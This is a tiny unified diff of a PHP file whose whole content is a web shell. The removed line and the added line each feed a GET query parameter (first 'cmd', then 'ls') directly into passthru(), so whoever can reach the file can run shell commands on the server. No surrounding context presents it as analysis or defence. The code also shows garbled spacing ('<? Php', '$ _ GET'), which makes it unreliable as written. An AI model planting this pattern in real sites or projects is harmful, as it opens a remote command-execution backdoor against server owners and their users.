@@ -1,3 +1,3 @@
 <? Php
-passthru ($ _ GET [cmd]);
+passthru ($ _ GET [ls]);
 ?>
